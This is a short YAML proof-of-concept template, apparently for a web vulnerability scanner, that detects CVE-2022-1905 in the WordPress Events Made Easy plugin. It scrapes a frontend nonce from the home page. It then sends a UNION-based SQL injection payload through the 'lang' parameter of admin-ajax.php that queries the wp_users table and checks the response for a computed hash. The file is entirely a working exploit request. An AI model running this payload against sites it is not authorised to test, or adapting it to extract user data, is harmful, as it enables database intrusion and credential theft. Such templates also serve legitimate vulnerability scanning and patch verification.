name: poc-yaml-wordpress-events-made-easy-cve-2022-1905-sqli
manual: true
transport: http
set:
    num: string(randomInt(10000, 99999))
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("translate_frontendnonce")
        output:
            search: '"\"translate_frontendnonce\":\"(?P<nonce>.+?)\"".submatch(response.body_string)'
            nonce: search["nonce"]
    r1:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=eme_select_country&eme_frontend_nonce={{nonce}}&lang=enen'++UNION+ALL+SELECT+NULL,(SELECT+md5({{num}})+from+wp_users),NULL,NULL,NULL,NULL--+-'
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(substr(md5(num), 2, 28))
expression: r0() && r1()
detail:
    author: Editor
    links:
        - https://wpscan.com/vulnerability/ff5fd894-aff3-400a-8eec-fad9d50f788e
    vulnerability:
        id: CT-443585
        level: critical
